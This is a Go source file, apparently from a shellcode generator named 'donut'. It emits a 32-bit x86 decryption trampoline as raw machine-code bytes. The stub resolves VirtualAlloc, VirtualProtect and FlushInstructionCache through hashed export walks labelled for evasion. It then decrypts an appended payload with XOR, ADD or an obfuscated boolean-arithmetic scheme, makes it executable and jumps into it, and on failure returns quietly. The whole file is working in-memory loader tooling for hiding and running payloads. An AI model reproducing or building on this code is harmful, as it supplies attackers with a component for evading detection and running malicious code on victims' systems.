package donut

import (
	"bytes"
	"encoding/binary"
	"fmt"
)

/*
	GenerateTrampoline32 emits the x86 mirror of GenerateTrampoline64.

	Artifact layout is [code][key16][ciphertext].  A call/pop PIC base addresses
	both appended blocks.  Entry and handoff preserve [ESP]=outer return and
	[ESP+4]=instance.  The success path restores the saved frame, then performs
	a balanced `push eax; ret`; the failure path restores the same frame and
	quietly returns to the outer caller.
*/

const (
	tr32VA    = 0x28
	tr32VP    = 0x2c
	tr32FIC   = 0x30
	tr32Page  = 0x34
	tr32Old   = 0x38
	tr32Frame = 0x14
)

func GenerateTrampoline32(coreLen int, key []byte, scheme coreScheme, family evadeHashFamily, seed uint32) ([]byte, error) {
	if coreLen <= 0 || coreLen > 0x00ffffff {
		return nil, fmt.Errorf("trampoline: bad core length %d", coreLen)
	}
	if len(key) != 16 {
		return nil, fmt.Errorf("trampoline: key must be 16 bytes")
	}
	if scheme < schemeXOR || scheme > schemeMBA {
		return nil, fmt.Errorf("trampoline: unknown scheme %d", scheme)
	}

	var b bytes.Buffer
	var failFixups []int

	b.WriteByte(0x55)           // push ebp
	b.Write([]byte{0x89, 0xe5}) // mov ebp,esp
	b.WriteByte(0x9c)           // pushfd
	b.WriteByte(0x60)           // pushad
	b.Write([]byte{0x83, 0xec, tr32Frame})

	// Resolve kernel32 once, then reload its saved base before each export walk.
	if err := emitModuleBase32(&b, family, seed, "kernel32.dll", &failFixups); err != nil {
		return nil, err
	}
	emitMovEBPDispFromEBX32(&b, tr32Page) // temporary module-base slot
	for _, api := range []struct {
		name string
		off  int
	}{
		{"VirtualAlloc", tr32VA},
		{"VirtualProtect", tr32VP},
		{"FlushInstructionCache", tr32FIC},
	} {
		emitMovEBXFromEBPDisp32(&b, tr32Page)
		if err := emitExportResolve32(&b, family, seed, api.name, &failFixups); err != nil {
			return nil, err
		}
		emitMovEBPDispFromEBX32(&b, api.off)
	}

	// VirtualAlloc(NULL, coreLen, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE).
	b.Write([]byte{0x6a, 0x04})
	b.WriteByte(0x68)
	binary.Write(&b, binary.LittleEndian, uint32(0x3000))
	b.WriteByte(0x68)
	binary.Write(&b, binary.LittleEndian, uint32(coreLen))
	b.Write([]byte{0x6a, 0x00})
	emitCallEBPDisp32(&b, tr32VA)
	b.Write([]byte{0x85, 0xc0, 0x0f, 0x84})
	fx := b.Len()
	binary.Write(&b, binary.LittleEndian, uint32(0))
	failFixups = append(failFixups, fx)
	emitMovEBPDispFromEAX32(&b, tr32Page)

	// call/pop PIC base.  EDX retains key base, ESI source, EDI destination,
	// ECX index.  The two ADD immediates are patched after code size is known.
	getPC := b.Len()
	b.Write([]byte{0xe8, 0, 0, 0, 0}) // call next; popped value = getPC+5
	b.WriteByte(0x5e)                 // pop esi
	b.Write([]byte{0x89, 0xf2})       // mov edx,esi
	b.Write([]byte{0x81, 0xc2, 0, 0, 0, 0})
	keyAddField := b.Len() - 4
	b.Write([]byte{0x81, 0xc6, 0, 0, 0, 0})
	srcAddField := b.Len() - 4
	emitMovEAXFromEBPDisp32(&b, tr32Page)
	b.Write([]byte{0x89, 0xc7}) // mov edi,eax
	b.Write([]byte{0x31, 0xc9}) // xor ecx,ecx

	loop := b.Len()
	b.Write([]byte{0x81, 0xf9})
	binary.Write(&b, binary.LittleEndian, uint32(coreLen))
	b.Write([]byte{0x0f, 0x83})
	doneField := b.Len()
	binary.Write(&b, binary.LittleEndian, uint32(0))
	b.Write([]byte{0x89, 0xcb})       // mov ebx,ecx
	b.Write([]byte{0x83, 0xe3, 0x0f}) // and ebx,15
	b.Write([]byte{0x8a, 0x1c, 0x1a}) // mov bl,[edx+ebx]
	b.Write([]byte{0x8a, 0x06})       // mov al,[esi]
	switch scheme {
	case schemeXOR:
		b.Write([]byte{0x30, 0xd8}) // xor al,bl
	case schemeADD:
		b.Write([]byte{0x00, 0xcb}) // add bl,cl (addend = key + i)
		b.Write([]byte{0x28, 0xd8}) // sub al,bl (cipher - addend)
	case schemeMBA:
		// a^b == (a & ~b) | (~a & b), emitted literally.
		b.Write([]byte{0x88, 0xc4}) // mov ah,al
		b.Write([]byte{0xf6, 0xd0}) // not al
		b.Write([]byte{0x20, 0xd8}) // and al,bl
		b.Write([]byte{0xf6, 0xd3}) // not bl
		b.Write([]byte{0x20, 0xe3}) // and bl,ah
		b.Write([]byte{0x08, 0xd8}) // or al,bl
	}
	b.Write([]byte{0x88, 0x07})       // mov [edi],al
	b.Write([]byte{0x46, 0x47, 0x41}) // inc esi; inc edi; inc ecx
	b.WriteByte(0xe9)
	backField := b.Len()
	binary.Write(&b, binary.LittleEndian, uint32(0))
	done := b.Len()
	binary.LittleEndian.PutUint32(b.Bytes()[doneField:doneField+4], uint32(done-(doneField+4)))
	binary.LittleEndian.PutUint32(b.Bytes()[backField:backField+4], uint32(loop-(backField+4)))

	// VirtualProtect(page, coreLen, PAGE_EXECUTE_READ, &old).
	b.Write([]byte{0x8d, 0x45, byte(256 - tr32Old)})
	b.WriteByte(0x50)
	b.Write([]byte{0x6a, 0x20})
	b.WriteByte(0x68)
	binary.Write(&b, binary.LittleEndian, uint32(coreLen))
	emitMovEAXFromEBPDisp32(&b, tr32Page)
	b.WriteByte(0x50)
	emitCallEBPDisp32(&b, tr32VP)
	b.Write([]byte{0x85, 0xc0, 0x0f, 0x84})
	fx = b.Len()
	binary.Write(&b, binary.LittleEndian, uint32(0))
	failFixups = append(failFixups, fx)

	// FlushInstructionCache((HANDLE)-1, page, coreLen).
	b.WriteByte(0x68)
	binary.Write(&b, binary.LittleEndian, uint32(coreLen))
	emitMovEAXFromEBPDisp32(&b, tr32Page)
	b.WriteByte(0x50)
	b.Write([]byte{0x6a, 0xff})
	emitCallEBPDisp32(&b, tr32FIC)
	b.Write([]byte{0x85, 0xc0, 0x0f, 0x84})
	fx = b.Len()
	binary.Write(&b, binary.LittleEndian, uint32(0))
	failFixups = append(failFixups, fx)

	// Put the target into PUSHAD's saved-EAX slot.  POPAD restores every other
	// entry register; EAX intentionally becomes the transfer target.
	emitMovEAXFromEBPDisp32(&b, tr32Page)
	b.Write([]byte{0x89, 0x45, 0xf8}) // mov [ebp-8],eax (saved EAX)
	emitTrampolineRestore32(&b)
	b.Write([]byte{0x50, 0xc3}) // push eax; ret, final ESP == entry ESP

	failPos := b.Len()
	emitTrampolineRestore32(&b)
	b.WriteByte(0xc3) // quiet return to outer caller
	for _, field := range failFixups {
		binary.LittleEndian.PutUint32(b.Bytes()[field:field+4], uint32(failPos-(field+4)))
	}

	codeLen := b.Len()
	b.Write(key)
	picBase := getPC + 5
	binary.LittleEndian.PutUint32(b.Bytes()[keyAddField:keyAddField+4], uint32(codeLen-picBase))
	binary.LittleEndian.PutUint32(b.Bytes()[srcAddField:srcAddField+4], uint32(codeLen+16-picBase))
	return append([]byte(nil), b.Bytes()...), nil
}

func emitTrampolineRestore32(b *bytes.Buffer) {
	b.Write([]byte{0x8d, 0x65, 0xdc}) // lea esp,[ebp-0x24]
	b.WriteByte(0x61)                 // popad
	b.WriteByte(0x9d)                 // popfd
	b.Write([]byte{0x89, 0xec})       // mov esp,ebp
	b.WriteByte(0x5d)                 // pop ebp
}
